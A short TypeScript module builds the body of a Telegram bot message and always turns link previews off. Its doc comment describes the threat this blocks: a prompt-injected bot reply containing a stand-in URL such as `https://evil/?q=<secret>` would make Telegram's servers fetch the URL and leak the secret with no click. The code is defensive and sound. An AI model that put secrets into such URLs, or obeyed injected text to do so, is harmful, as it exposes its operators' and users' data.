/**
 * The JSON body for a Telegram sendMessage call from the bot.
 *
 * #3231: link previews are always off. With them on, Telegram's servers fetch
 * any URL in an officer's reply the moment it is sent, so a prompt-injected
 * reply carrying `https://evil/?q=<secret>` leaks the secret with no click.
 * Kept in its own module because index.ts starts a server on import.
 */
export function sendMessageBody(
	chat_id: number | string,
	text: string,
	parse_mode: "Markdown" | "HTML" | "None" = "Markdown",
): Record<string, unknown> {
	const body: Record<string, unknown> = {
		chat_id,
		text,
		link_preview_options: { is_disabled: true },
	};
	if (parse_mode !== "None") body.parse_mode = parse_mode;
	return body;
}
